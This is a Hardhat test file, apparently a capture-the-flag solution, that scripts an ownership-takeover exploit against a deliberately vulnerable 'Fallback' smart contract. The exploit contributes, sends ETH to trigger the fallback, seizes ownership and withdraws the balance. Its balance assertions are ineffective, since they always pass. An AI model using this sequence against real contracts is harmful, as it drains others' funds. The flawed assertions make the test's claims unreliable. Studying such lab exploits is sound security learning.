import { developmentChains } from "../../helper-hardhat-config"
import { network, ethers, deployments, waffle } from "hardhat"
import { Fallback } from "../../typechain-types"
import { assert } from "chai"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Fallback Hacked", function() {
        let fallback: Fallback
        let fallbackContract: Fallback
        let accounts: SignerWithAddress[]
        let deployer: SignerWithAddress
        let hacker : SignerWithAddress
        let MIN_AMOUNT = 1

        beforeEach(async() => {
            accounts = await ethers.getSigners()
            deployer = accounts[0]
            hacker = accounts[1]
            await deployments.fixture("fallback")
            fallbackContract = await ethers.getContract("Fallback")
            fallback = fallbackContract.connect(hacker)

        })
        describe("Ownership", function(){
            it("The principal owner is deployer", async()=> {
                let owner = await fallbackContract.owner()
                assert.equal(owner,deployer.address)
            })
            it("You claim ownership of the contract and you reduce its balance to 0", async() => {
                // Insert into contribute list
                let tx1 = await fallback.contribute({value: MIN_AMOUNT})
                tx1.wait(1)
                // change the ownership
                let tx2 = await hacker.sendTransaction({
                    to: fallback.address,
                    value: MIN_AMOUNT
                })
                tx2.wait()

                let provider = waffle.provider
                let balance = (await provider.getBalance(fallbackContract.address)).toString()
                assert(balance,"1")
                // Check new owner
                let newOwner = await fallback.owner()
                assert.equal(newOwner,hacker.address)
                // you reduce its balance to 0
                let tx3 = await fallback.withdraw()
                tx3.wait()
                balance = (await provider.getBalance(fallbackContract.address)).toString()
                // Check balance to 0
                assert(balance,"0")
            }) 
        })
    })